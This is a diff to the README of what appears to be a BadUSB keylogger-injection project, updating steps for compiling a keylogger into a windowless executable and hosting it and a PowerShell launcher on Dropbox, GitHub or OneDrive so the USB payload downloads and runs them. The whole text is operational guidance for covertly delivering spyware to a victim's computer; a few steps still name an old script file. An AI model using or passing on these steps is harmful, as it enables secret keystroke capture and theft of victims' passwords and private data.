@@ -62,35 +62,36 @@ pyinstaller --onefile -w keylogger.py
 * Turn off caps lock.
 * Switch the keyboard layout to French (or adapt the code according to your layout).
 # How to set a link for wget the script ⬇️
+Remember to upload first keylogger.exe file to add its link to startSrcipt.ps1 file.
 ## Dropbox
 1. Create a dropbox account [here](https://www.dropbox.com);
 
-2. Upload ciaoV2.ps1;
+2. Upload startScript.ps1 and keylogger.exe;
 
 3. Copy the link of the file and change ?dl=0 by ?raw=1;
 
-4. The link will be like this : https://dropbox.com/s/link/ciaoV2.ps1?raw=1;
+4. The link will be like this : https://dropbox.com/s/link/startScript.ps1?raw=1;
 
-5. Now put this link in the [BadUSB_passStealer.ino](https://github.com/tuconnaisyouknow/BadUSB_keyloggerInjector/blob/main/BadUSB_keylogger.ino) file;
+5. Now put these link in the [keylogger.ino](https://github.com/tuconnaisyouknow/BadUSB_keyloggerInjector/blob/main/BadUSB_keylogger.ino) file;
 ## Github
 1. Create a Github account [here](https://github.com/signup);
 
 2. Create a public repository;
 
-3. Upload ciaoV2.ps1;
+3. Upload ciaoV2.ps1 and keylogger.exe;
 
-4. Go to the ciaoV2.ps1 page and click on RAW button;
+4. Go to the startScript.ps1 page and click on RAW button;
 
-5. Copy the link of the RAW page and put it in the [BadUSB_passStealer.ino](https://github.com/tuconnaisyouknow/BadUSB_keyloggerInjector/blob/main/BadUSB_keylogger.ino) file;
+5. Copy these link of the RAW page and put it in the [keylogger.ino](https://github.com/tuconnaisyouknow/BadUSB_keyloggerInjector/blob/main/BadUSB_keylogger.ino) file;
 ## One Drive
 1. Create a One Drive account [here](https://signup.live.com/signup);
 
-2. Upload keylogger.exe file;
+2. Upload startScript.ps1 and keylogger.exe file;
 
-3. Click on keylogger.exe;
+3. Click on your file;
 
 4. Click on download button;
 
 5. Go on your browser download list (nameofyourbrowser://downloads);
 
-6. Copy the download link and put the link in [BadUSB_passStealer.ino](https://github.com/tuconnaisyouknow/BadUSB_keyloggerInjector/blob/main/BadUSB_keylogger.ino)
+6. Copy the download link and put the link in [keylogger.ino](https://github.com/tuconnaisyouknow/BadUSB_keyloggerInjector/blob/main/BadUSB_keylogger.ino)
